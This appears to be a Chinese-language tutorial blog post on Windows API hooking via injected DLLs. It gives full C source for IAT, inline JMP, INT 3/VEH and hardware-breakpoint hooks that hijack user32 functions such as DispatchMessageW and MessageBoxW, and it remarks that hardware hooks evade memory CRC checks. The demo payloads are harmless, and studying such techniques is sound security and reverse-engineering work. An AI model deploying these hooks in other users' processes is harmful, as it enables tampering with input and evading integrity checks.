![1765691353434](../images/2025-12-12-windows_dll_injection/1765691353434.png)

### 基于导入表的 Hook (IAT Hook)

IAT Hook 通过修改 IAT 表中目标函数的地址，将其替换为恶意 Hook 函数的地址。当程序下次“查表”调用该函数时，就会跳转到恶意代码。

#### 实现方法

**定位导入表** ：从 DOS 头 -> NT 头 -> 可选头 -> 数据目录中找到  **导入表 (Import Directory)** 。

**定位目标 DLL** ：遍历导入描述符 (`IMAGE_IMPORT_DESCRIPTOR`)，找到目标 DLL（如 `user32.dll`）

**双桥遍历** ：同时遍历 **OriginalFirstThunk (INT)** 和  **FirstThunk (IAT)** 。

* `OriginalFirstThunk` 保存函数 **名称** ，永远不会改变，用于匹配目标函数名（如 "DispatchMessageW"）。
* `FirstThunk` 保存函数 **地址** ，用于实施修改。

![1765846796434](../images/2025-12-12-windows_dll_injection/1765846796434.png)

```c
// 编译命令: gcc -shared -o IATHook_DualBridge.dll IATHook_DualBridge.c
#include <stdio.h>
#include <windows.h>

// 定义 MessageBoxW 函数指针类型
typedef LRESULT (WINAPI *PDispatchMessageW)(CONST MSG *lpMsg);
PDispatchMessageW pOriginalDispatchMessageW = NULL;

LRESULT WINAPI MyDispatchMessageW(CONST MSG *lpMsg) {
    // 检查是否是字符消息 (WM_CHAR = 0x0102)
    if (lpMsg->message == WM_CHAR) {
        wchar_t ch = (wchar_t)lpMsg->wParam; // wParam 存放的就是字符的 ASCII/Unicode 码
        if(((MSG*)lpMsg)->wParam=='a')((MSG*)lpMsg)->wParam = 'b'; 
    }
    // 继续调用原函数，让 Notepad 正常处理
    return pOriginalDispatchMessageW(lpMsg);
}
void StartIATHook() {
    // 1. 获取当前模块基址 (注入后即为 Notepad.exe 的基址)
    HMODULE hModule = GetModuleHandle(NULL);
    // 2. 获取 DOS 头和 NT 头
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    // 3. 获取导入表目录
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + 
        pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    // 4. 遍历导入表寻找 user32.dll
    while (pImportDesc->Name) {
        char* pszDllName = (char*)((BYTE*)hModule + pImportDesc->Name);
        if (_stricmp(pszDllName, "user32.dll") == 0) {
            // 桥1: OriginalFirstThunk (INT) - 用于查找函数名 [cite: 22]
            PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->OriginalFirstThunk);
            // 桥2: FirstThunk (IAT) - 用于修改函数地址 [cite: 23]
            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
            // 同时遍历两个数组，索引是同步的
            while (pOriginalThunk->u1.AddressOfData) {
                // 检查是否通过名称导入 (最高位不是1)
                // IMAGE_ORDINAL_FLAG 在64位下是高位判断，防止读取序号出错
                if (!(pOriginalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    // 通过 OriginalThunk 获取函数名结构
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + pOriginalThunk->u1.AddressOfData);
                    // 比对函数名
                    if (strcmp(pImportByName->Name, "DispatchMessageW") == 0) {
                        // 1. 保存旧地址 (从 FirstThunk 里读)
                        pOriginalDispatchMessageW = (PDispatchMessageW)pFirstThunk->u1.Function;
                        // 2. 修改内存保护属性
                        DWORD dwOldProtect;
                        VirtualProtect(&pFirstThunk->u1.Function, sizeof(LPVOID), PAGE_READWRITE, &dwOldProtect);
                        // 3. 修改 IAT，指向我们的函数 [cite: 27]
                        // 注意：这里修改的是 FirstThunk，不是 OriginalThunk
                        pFirstThunk->u1.Function = (ULONG_PTR)MyDispatchMessageW;
                        // 4. 恢复保护
                        VirtualProtect(&pFirstThunk->u1.Function, sizeof(LPVOID), dwOldProtect, &dwOldProtect);
                        return;
                    }
                }
                pOriginalThunk++;
                pFirstThunk++;
            }
        }
        pImportDesc++;
    }
}

// DLL 入口点
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        StartIATHook();
        break;
    }
    return TRUE;
}
```

#### 攻击效果

所有输入的 `a`都变成了 `b`

![1765703026493](../images/2025-12-12-windows_dll_injection/1765703026493.png)

### 基于代码的内联 Hook (Inline Hook)

Inline Hook 的本质是“劫持”函数入口。
它不依赖 PE 结构，而是直接修改目标函数在内存中的 **机器码** 。通常是在函数开头写入一条**JMP**指令。当 CPU 执行到该函数时，立即被强制跳转到 Hook 函数。

#### 实现方法

`GetProcAddress` ：直接获取目标函数的内存地址，无需解析 PE。

```c
// 编译命令: gcc -shared -o InlineHookDll.dll InlineHookDll.c
#include <stdio.h>
#include <windows.h>

// 定义 DispatchMessageW 函数指针类型
typedef LRESULT (WINAPI *PDispatchMessageW)(CONST MSG *lpMsg);

PDispatchMessageW g_pOriginalDispatchMessageW = NULL;
BYTE g_OriginalBytes[14] = { 0 }; // 用于保存函数原本的前14个字节
BYTE g_PatchBytes[14] = { 0 };    // 用于保存我们要写入的 JMP 指令

void InstallHook();
void UninstallHook();

LRESULT WINAPI MyDispatchMessageW(CONST MSG *lpMsg) {
  
    // [关键步骤 A] 暂时脱钩 (恢复原始代码)
    // 为什么要恢复？因为我们等下要调用原函数。如果不恢复，
    // 调用原函数时又会遇到 JMP 指令跳回这里，导致死循环 (Stack Overflow)。
    UninstallHook();
    if (lpMsg->message == WM_CHAR) {
        if (lpMsg->wParam == 'a') {
            ((MSG*)lpMsg)->wParam = 'b';
        }
    }

    // [关键步骤 C] 调用原函数 (此时原函数已恢复正常)
    LRESULT result = g_pOriginalDispatchMessageW(lpMsg);
    // [关键步骤 D] 重新挂钩
    // 原函数执行完了，赶紧把钩子挂回去，拦截下一次消息
    InstallHook();
    return result;
}

void InstallHook() {
    if (g_pOriginalDispatchMessageW == NULL) return;
    DWORD dwOldProtect;
    // 修改内存权限为可读可写可执行 (User32的代码段通常是只读的) [cite: 32]
    VirtualProtect(g_pOriginalDispatchMessageW, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    // 写入我们要构造好的 JMP 指令
    // 效果：只要 CPU 执行到 DispatchMessageW 开头，就直接跳到 MyDispatchMessageW
    memcpy(g_pOriginalDispatchMessageW, g_PatchBytes, 14);
    // 恢复内存权限
    VirtualProtect(g_pOriginalDispatchMessageW, 14, dwOldProtect, &dwOldProtect);
}
void UninstallHook() {
    if (g_pOriginalDispatchMessageW == NULL) return;
    DWORD dwOldProtect;
    VirtualProtect(g_pOriginalDispatchMessageW, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    // 把备份的最原始的字节写回去
    memcpy(g_pOriginalDispatchMessageW, g_OriginalBytes, 14);
    VirtualProtect(g_pOriginalDispatchMessageW, 14, dwOldProtect, &dwOldProtect);
}

void InitHook() {
    // 获取 DispatchMessageW 的真实地址
    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    g_pOriginalDispatchMessageW = (PDispatchMessageW)GetProcAddress(hUser32, "DispatchMessageW");
    if (!g_pOriginalDispatchMessageW) return;
    memcpy(g_OriginalBytes, g_pOriginalDispatchMessageW, 14);
    // 2. 构造 64位 的绝对跳转指令 (JMP [RIP+0])
    // 指令机器码: FF 25 00 00 00 00 (6字节) + 8字节的目标地址
    // 0xFF 0x25 是 JMP [RIP+offset]
    g_PatchBytes[0] = 0xFF;
    g_PatchBytes[1] = 0x25;
    g_PatchBytes[2] = 0x00;
    g_PatchBytes[3] = 0x00;
    g_PatchBytes[4] = 0x00;
    g_PatchBytes[5] = 0x00;
    // 接下来的 8 个字节填入我们的函数 MyDispatchMessageW 的内存地址
    *(ULONG_PTR*)(&g_PatchBytes[6]) = (ULONG_PTR)MyDispatchMessageW;
    // 3. 正式挂钩
    InstallHook();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        InitHook(); 
        break;
    case DLL_PROCESS_DETACH:
        UninstallHook(); 
        break;
    }
    return TRUE;
}
```

### 热补丁 Hook (HotFix Hook)

它利用了 Windows API（主要在 32 位下）特有的函数头结构：

1. 函数开头是 2 字节的无用指令 `MOV EDI, EDI`。
2. 函数上方有 5 字节的空白区 (`NOP` 或 `INT 3`)。
   原理是将开头的 2 字节改为“短跳转（跳到上方）”，在上方写入“长跳转（跳到 Hook 函数）”。

本质和Inline Hook都是更改函数入口处的机器码

### 软件断点 Hook (Int 3 Hook)

Int 3 Hook 利用 CPU 的异常处理机制。
它将目标函数的第一字节替换为 `0xCC` (汇编指令  **INT 3** )。当 CPU 执行到这里时，会暂停并抛出 **`EXCEPTION_BREAKPOINT`** 异常。通过注册异常处理程序（VEH），可以捕获这个异常并执行自定义逻辑。

中断hook都得关闭kernel debug：`bcdedit /debug off`

#### 实现方法

**`AddVectoredExceptionHandler (VEH)`** ：注册一个全局异常处理函数，用来捕获 `0xCC` 触发的异常。相比 SEH，VEH 优先级更高且作用于全进程。

```c
#include <windows.h>
#include <stdio.h>

// 目标函数指针
void* g_pTargetFunc = NULL;
// 保存原始字节
BYTE g_OriginalByte = 0;
// 标记是否已经 Hook
BOOL g_bIsHooked = FALSE;
// 我们的处理逻辑
void MyHookHandler() {
    MessageBoxA(NULL, "INT 3 Hook Triggered via VEH!", "Hacked", MB_OK);
}
// VEH 异常处理函数
LONG WINAPI MyVEHHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    // 1. 判断是否是断点异常 (0x80000003) 且地址是我们 Hook 的地址
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT &&
        pExceptionInfo->ExceptionRecord->ExceptionAddress == g_pTargetFunc) {
        // 2. 执行我们的恶意逻辑
        MyHookHandler();
        // 3 恢复原始字节 (去掉 0xCC)
        DWORD dwOld;
        VirtualProtect(g_pTargetFunc, 1, PAGE_EXECUTE_READWRITE, &dwOld);
        memcpy(g_pTargetFunc, &g_OriginalByte, 1);
        VirtualProtect(g_pTargetFunc, 1, dwOld, &dwOld);  
        // 4.将EIP/RIP 指针倒退 1 个字节
        // 因为 CPU 执行了 INT 3 后，指令指针已经指向了下一个字节，我们需要退回去重新执行原指令
#ifdef _WIN64
        pExceptionInfo->ContextRecord->Rip--;
#else
        pExceptionInfo->ContextRecord->Eip--;
#endif   
        // 注意：这种简单的 Hook 是一次性的。
        // 如果想持续 Hook，需要在这里设置单步调试 (EFLAGS -> TF位)，
        // 在单步异常中再次写入 0xCC。为简化代码，这里只演示触发一次。
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void InstallInt3Hook() {
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    g_pTargetFunc = (void*)GetProcAddress(hUser32, "MessageBoxW");
    if (!g_pTargetFunc) return;
    // 1. 注册全局向量化异常处理程序 (VEH)
    // 参数 1 表示添加到链表头部，优先处理
    AddVectoredExceptionHandler(1, MyVEHHandler);
    // 2. 备份原字节
    memcpy(&g_OriginalByte, g_pTargetFunc, 1);
    // 3. 写入 0xCC (INT 3)
    DWORD dwOld;
    VirtualProtect(g_pTargetFunc, 1, PAGE_EXECUTE_READWRITE, &dwOld);
    *(BYTE*)g_pTargetFunc = 0xCC;
    VirtualProtect(g_pTargetFunc, 1, dwOld, &dwOld);
    g_bIsHooked = TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        InstallInt3Hook();
    }
    return TRUE;
}
```

#### 攻击效果

![1765856499390](../images/2025-12-12-windows_dll_injection/1765856499390.png)

### 硬件断点 Hook (Hardware Hook)

利用 CPU 自带的  **调试寄存器 (Dr0 - Dr7)** 。

一个CPU一般有8个调试寄存器（DR0 ~ DR7 寄存器），用于管理硬件断点

* DR0 ~DR3： 存储硬件断点地址。
* DR4 和 DR5： 保留。
* DR6：调试状态寄存器，用于向调试器报告事件的详细信息，以供调试器判断发生的是何种事件。
* DR7：调试控制寄存器，用于定义断点的中断条件。

这是一种 **无损 Hook** ，不需要修改内存中的任何代码或数据，因此能完美绕过内存完整性校验（CRC）。设置断点后，CPU 执行到指定地址会抛出 **`EXCEPTION_SINGLE_STEP`** 异常。

中断hook都得关闭kernel debug：`bcdedit /debug off`

#### 实现方法

* `GetThreadContext` / `SetThreadContext` ： 最关键 。这是应用层唯一能直接读写 CPU 寄存器（Dr0-Dr7）的接口。
* `SuspendThread` / `ResumeThread` ：修改线程上下文前必须挂起线程，否则可能导致状态不一致或崩溃。
* `OpenThread` / `CreateToolhelp32Snapshot` ：因为硬件断点是属于线程的（不是全局的），必须遍历并打开进程内的每一个线程分别设置。
* 设置寄存器 ：
* Dr0 ：填入目标函数地址。
* Dr7 ：控制位。启用 Dr0 (L0位)，并设置为“执行时触发”。
* 触发异常 ：CPU 运行到目标地址，触发 `EXCEPTION_SINGLE_STEP`。
* VEH 捕获 ：检查 Dr6 寄存器，确认是否是由我们设置的断点触发的。
* 抗死锁机制 (Resume Flag) ：
* 不同于软件断点，这里不需要恢复内存（因为没改过内存）。
* 关键操作 ：设置 `EFLAGS` 寄存器的 RF (Resume Flag, 第16位) 为 1。
* 作用 ：告诉 CPU “请忽略下一条指令的断点”。如果没有这一步，CPU 会在同一行代码无限重复触发断点，导致死循环。

```c
// 编译命令: gcc -shared -o HardwareHook.dll HardwareHookFixed.c
#include <windows.h>
#include <tlhelp32.h> // 需要用到快照遍历线程
#include <stdio.h>

void* g_pTargetFunc = NULL;
void MyHookHandler() {
    MessageBoxA(NULL, "Hardware Hook Triggered via VEH!", "Hacked", MB_OK);
}
// VEH 异常处理函数
LONG WINAPI MyHwVEHHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    // 硬件断点触发的是 EXCEPTION_SINGLE_STEP (0x80000004)
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 检查 DR6 的 B0 位 (Bit 0)，确认是否是 Dr0 触发的
        if (pExceptionInfo->ContextRecord->Dr6 & 0x1) {
            // 再次确认指令指针是否在目标地址
#ifdef _WIN64
            if ((void*)pExceptionInfo->ContextRecord->Rip == g_pTargetFunc)
#else
            if ((void*)pExceptionInfo->ContextRecord->Eip == g_pTargetFunc)
#endif
            {
                MyHookHandler();
                // [关键] 设置 Resume Flag (RF 位, EFLAGS 第 16 位)
                // 作用：告诉 CPU "忽略下一条指令的调试断点"
                // 这样程序继续执行时，不会立刻再次触发断点，执行完一条指令后 RF 自动清除
                // 从而完美避开死循环。
                pExceptionInfo->ContextRecord->EFlags |= 0x10000;
                // 清除 DR6 状态，为下次做准备
                pExceptionInfo->ContextRecord->Dr6 &= ~0x1;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// 给单个线程设置硬件断点
void SetHardwareBreakpoint(DWORD dwThreadId, void* address) {
    if (dwThreadId == GetCurrentThreadId()) return; // 跳过当前注入线程
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
    if (!hThread) return;
    // 必须挂起线程才能设置上下文
    if (SuspendThread(hThread) != (DWORD)-1) {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(hThread, &ctx)) {
            // 设置 DR0
            ctx.Dr0 = (DWORD_PTR)address;
            // 清除 DR7 旧状态
            ctx.Dr7 &= ~(1 | 2 | 4 | 8);  
            // 设置 DR7: L0=1 (启用Dr0), RW0=00 (执行断点), LEN0=00 (1字节)
            ctx.Dr7 |= 1; 
            SetThreadContext(hThread, &ctx);
        }
        ResumeThread(hThread);
    }
    CloseHandle(hThread);
}
// 遍历当前进程的所有线程并设置断点
void InstallHwHookForAllThreads() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    g_pTargetFunc = (void*)GetProcAddress(hUser32, "MessageBoxW");
    if (!g_pTargetFunc) return;
    // 1. 注册 VEH
    AddVectoredExceptionHandler(1, MyHwVEHHandler);
    // 2. 遍历所有线程
    DWORD dwCurrentPid = GetCurrentProcessId();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(hSnapshot, &te32)) {
            do {
                // 只处理属于当前进程的线程
                if (te32.th32OwnerProcessID == dwCurrentPid) {
                    SetHardwareBreakpoint(te32.th32ThreadID, g_pTargetFunc);
                }
            } while (Thread32Next(hSnapshot, &te32));
        }
        CloseHandle(hSnapshot);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // 使用新线程去执行安装，避免阻塞
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InstallHwHookForAllThreads, NULL, 0, NULL);
    }
    return TRUE;
}
```

#### 攻击效果

![1765856651291](../images/2025-12-12-windows_dll_injection/1765856651291.png)
